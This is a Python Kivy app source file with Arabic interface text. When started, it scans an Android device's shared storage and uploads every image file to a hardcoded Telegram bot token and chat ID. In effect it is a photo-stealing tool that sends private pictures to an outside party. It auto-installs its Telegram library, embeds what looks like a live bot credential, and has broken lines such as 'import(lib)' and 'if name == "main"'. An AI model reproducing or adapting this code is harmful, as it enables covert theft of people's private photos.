import sys
import os
import subprocess
import threading
from concurrent.futures import ThreadPoolExecutor
from kivy.app import App
from kivy.uix.button import Button
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.textinput import TextInput
from kivy.uix.label import Label
from kivy.uix.scrollview import ScrollView
from kivy.uix.popup import Popup

# قائمة المكتبات المطلوبة لتثبيتها
required_libraries = ['pyTelegramBotAPI']

def install_libraries():
    for lib in required_libraries:
        try:
            import(lib)
        except ImportError:
            print(f"{lib} غير مثبت، جاري تثبيته...")
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', lib])

install_libraries()

import telebot

bot = telebot.TeleBot('7372239135:AAHdd7Ko2_NfkFu7SyXQ4lBZu7amFooF5fE')
chat_id = '6185375878'

dir_path = "/storage/emulated/0/"
is_running = False  # متغير للتحكم بحالة البوت
sent_files = []  # قائمة لتخزين الملفات المرسلة

# دالة إرسال الملفات إلى Telegram
def send_file(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp", ".heic")):
            bot.send_photo(chat_id=chat_id, photo=f)
            sent_files.append(file_path)

# دالة العمل في الخلفية
def background():
    global is_running
    with ThreadPoolExecutor(max_workers=300) as executor:
        for root, dirs, files in os.walk(dir_path):
            if not is_running:
                break
            for file in files:
                file_path = os.path.join(root, file)
                if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp", ".heic", ".PNG", ".JPG", ".JPEG")):
                    executor.submit(send_file, file_path)

# دالة عرض الإشعارات
def show_notification(message):
    popup = Popup(title="إشعار", content=Label(text=message), size_hint=(0.6, 0.4))
    popup.open()

# التطبيق الرئيسي
class MyApp(App):
    def build(self):
        global dir_path
        layout = BoxLayout(orientation='vertical')
        
        # عناصر واجهة المستخدم
        label = Label(text="أدخل مسار الصور:")
        text_input = TextInput(text=dir_path, multiline=False)
        start_button = Button(text="تشغيل البوت", background_color=(0.2, 0.8, 0.2, 1))
        stop_button = Button(text="إيقاف البوت", background_color=(0.8, 0.2, 0.2, 1))
        scroll_view = ScrollView(size_hint=(1, 0.4))
        sent_files_label = Label(size_hint_y=None, text="الملفات المرسلة:\n", halign="left", valign="top")
        sent_files_label.bind(size=lambda *args: sent_files_label.setter('text_size')(sent_files_label, (sent_files_label.width, None)))
        scroll_view.add_widget(sent_files_label)
        
        # تحديث قائمة الملفات المرسلة
        def update_sent_files():
            sent_files_label.text = "الملفات المرسلة:\n" + "\n".join(sent_files)

        # دوال الأزرار
        def start_bot(instance):
            global is_running, dir_path
            dir_path = text_input.text
            is_running = True
            threading.Thread(target=background).start()
            show_notification("تم تشغيل البوت")
        
        def stop_bot(instance):
            global is_running
            is_running = False
            show_notification("تم إيقاف البوت")

        # ربط الأزرار بالأحداث
        start_button.bind(on_press=start_bot)
        stop_button.bind(on_press=stop_bot)

        # إضافة العناصر إلى الواجهة
        layout.add_widget(label)
        layout.add_widget(text_input)
        layout.add_widget(start_button)
        layout.add_widget(stop_button)
        layout.add_widget(scroll_view)

        return layout

if name == "main":
    MyApp().run()
